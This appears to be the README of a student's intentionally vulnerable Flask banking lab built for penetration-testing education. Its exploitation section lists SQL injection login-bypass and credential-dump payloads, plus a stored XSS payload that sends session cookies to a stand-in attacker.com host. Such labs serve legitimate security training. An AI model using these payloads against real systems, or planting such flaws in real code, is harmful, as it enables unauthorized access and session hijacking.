# SecureBank VulnLab

![Security](https://img.shields.io/badge/Security-Vulnerable-critical)
![Python](https://img.shields.io/badge/Python-3.12-blue)
![Flask](https://img.shields.io/badge/Flask-3.0-green)
![Status](https://img.shields.io/badge/Status-Day%205%2F30-yellow)

**Intentionally vulnerable banking application for penetration testing education.** Part of a comprehensive 30-day cybersecurity learning project demonstrating real-world vulnerability exploitation and remediation.

---

## Warning

**This application contains critical security vulnerabilities by design.** 

Intended strictly for authorized security training and educational purposes. Never deploy to production environments or expose to public networks. Unauthorized testing on systems without explicit permission is illegal.

---

## Overview

SecureBank simulates a realistic online banking platform with complete transactional functionality, deliberately embedded with 10+ critical OWASP Top 10 vulnerabilities for hands-on security research and penetration testing practice.

**Core Features:**
- User authentication and registration system
- Real-time money transfers between accounts
- Transaction history with detailed logging
- Customer support ticket management
- User profile customization

**Technology Stack:** Python Flask | SQLite | Bootstrap 5 | Nginx | Ubuntu 24.04 LTS

---

## Vulnerability Catalog

| Vulnerability | Severity | CVSS | Status |
|---------------|----------|------|--------|
| SQL Injection | Critical | 9.3 | **Documented** |
| Cross-Site Scripting (XSS) | High | 7.1 | **Documented** |
| Plain Text Password Storage | Critical | 9.8 | Pending |
| Insecure Direct Object Reference (IDOR) | High | 8.1 | Pending |
| Cross-Site Request Forgery (CSRF) | High | 8.1 | Pending |
| Broken Authentication | High | 8.5 | Pending |
| Input Validation Failures | High | 7.8 | Pending |
| Information Disclosure | Medium | 6.5 | Pending |
| Session Management Issues | High | 7.2 | Pending |
| No Rate Limiting | Medium | 6.8 | Pending |

**Progress:** 2/10 vulnerabilities fully documented with professional reports

---

## Quick Start
```bash
# Clone repository
git clone https://github.com/rahardjo-glenvio/cybersecurity-portfolio.git
cd cybersecurity-portfolio/labs/vulnlab-30days/app

# Install dependencies
pip install flask flask-sqlalchemy

# Initialize and run
python3 app.py
```

**Access:** `http://localhost:5000`

**Test Credentials:**
- Administrator: `admin` / `admin123`
- Standard User: `test` / `test123`
- Additional Users: `alice` / `alice123`, `bob` / `bob123`

---

## Exploitation Examples

### SQL Injection (VULN-001)

**Authentication Bypass:**
```sql
Username: admin' OR '1'='1' --
Password: [anything]
Result: Direct admin access without valid credentials
```

**Data Extraction:**
```sql
Username: ' UNION SELECT GROUP_CONCAT(username || ':' || password) FROM user--
Result: Complete user credentials database dump
```

### Cross-Site Scripting (VULN-002)

**Stored XSS via Support Tickets:**
```html
Subject: Account Inquiry
Message: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
Result: Session hijacking when admin views ticket
```

**Reflected XSS:**
```
/dashboard?message=<script>alert(document.cookie)</script>
Result: Cookie exposure in victim browser
```

### IDOR (In Progress)

**Unauthorized Resource Access:**
```
Authenticated as user_id=2
Access: /ticket/1 (belongs to user_id=1)
Result: View other users' private support tickets
```

### Input Validation (In Progress)

**Negative Balance Exploit:**
```
Transfer Amount: -50000
Result: Sender balance increases instead of decreasing
```

---

## Repository Structure
```
vulnlab-30days/
├── app/
│   ├── app.py              # Main Flask application
│   ├── database.py         # SQLAlchemy models
│   ├── templates/          # HTML templates
│   └── static/            # CSS, JS assets
├── exploits/
│   ├── SQL-Injection-Report.pdf
│   └── XSS-Vulnerability-Report.pdf
├── config/
│   └── nginx.conf         # Nginx reverse proxy config
└── README.md
```

---

## Documentation

**Completed Reports:**
- **SQL Injection Vulnerability Assessment** - Comprehensive 28-page analysis covering authentication bypass, data extraction, and mass credential compromise via UNION-based attacks
- **Cross-Site Scripting (XSS) Analysis** - Detailed 19-page report demonstrating stored and reflected XSS exploitation, session hijacking, and DOM-based attacks

**Pending Documentation:**
- Plain Text Password Storage
- IDOR (Insecure Direct Object Reference)
- CSRF (Cross-Site Request Forgery)
- Broken Authentication Mechanisms
- Input Validation Failures
- Information Disclosure
- Session Management Vulnerabilities
- Rate Limiting Absence

Each report includes: Executive summary, CVSS scoring, step-by-step exploitation, business impact analysis, and remediation guidance.

---

## Learning Outcomes

**Technical Competencies:**
- Full-stack web application development with Python Flask
- Database design and SQLAlchemy ORM implementation
- Linux system administration and Nginx configuration
- Frontend development with Bootstrap 5

**Security Expertise:**
- OWASP Top 10 vulnerability identification and exploitation
- Penetration testing methodologies and documentation
- Vulnerability assessment and CVSS scoring
- Secure coding practices and defensive programming
- Attack vector analysis and threat modeling

**Professional Skills:**
- Technical report writing for cybersecurity audiences
- Project management and milestone tracking
- Version control with Git and GitHub
- Professional documentation standards

---

## Project Timeline

**Phase 1: Development (Dec 31, 2025 - Jan 2, 2026)** - Complete
- Application architecture and database design
- Full-stack implementation with Flask
- User interface design and Bootstrap integration
- Nginx reverse proxy configuration

**Phase 2: Vulnerability Research (Jan 3 - Jan 15, 2026)** - In Progress
- Systematic OWASP Top 10 vulnerability injection
- Exploitation proof-of-concept development
- Professional security report generation
- **Current Status:** 2/10 vulnerabilities documented (20% complete)

**Phase 3: Security Documentation (Jan 16 - Jan 25, 2026)** - Scheduled
- Comprehensive vulnerability assessment reports
- CVSS scoring and risk analysis
- Business impact quantification
- Remediation strategy development

**Phase 4: Remediation & Verification (Jan 26 - Jan 30, 2026)** - Scheduled
- Secure code implementation
- Vulnerability patching and validation
- Final security testing and verification
- Project portfolio finalization

---

## Academic Context

**Institution:** SMK Telkom Purwokerto  
**Program:** Computer Network & Telecommunications Engineering (TJKT)  
**Specialization:** Cybersecurity  
**Grade Level:** 11th Grade (Preparing for 12th Grade PKL Internship)

**Project Purpose:**  
This project serves as practical preparation for mandatory industry internship (PKL) and demonstrates hands-on cybersecurity competency for internship applications to penetration testing companies in Yogyakarta, particularly X-code Security.

---

## Ethical Disclaimer

**Educational Use Only.** This application contains intentional security vulnerabilities designed exclusively for authorized cybersecurity education and training purposes. 

**Legal Notice:** Unauthorized security testing, penetration testing, or exploitation of systems without explicit written permission is illegal and may result in criminal prosecution. This project is designed for controlled learning environments only.

**Liability:** The author assumes no responsibility for misuse, unauthorized testing, or any damages resulting from the deployment or exploitation of this application outside authorized educational contexts.

---

## Credits & Acknowledgments

**Project Author:** Glenvio Regalito Rahardjo  
**Educational Institution:** SMK Telkom Purwokerto - Cybersecurity Specialization  
**Technical Mentorship:** Developed with Claude AI (Anthropic) for architecture guidance, security analysis, and professional documentation standards  
**Academic Supervisor:** Pak Agung (Vocational Teacher, PKL Coordinator)

---

**Last Updated:** January 4, 2026 | Day 5/30  
**Project Status:** Active Development - Vulnerability Documentation Phase  
**Next Milestone:** IDOR and Plain Text Password reports (Jan 6-7, 2026)
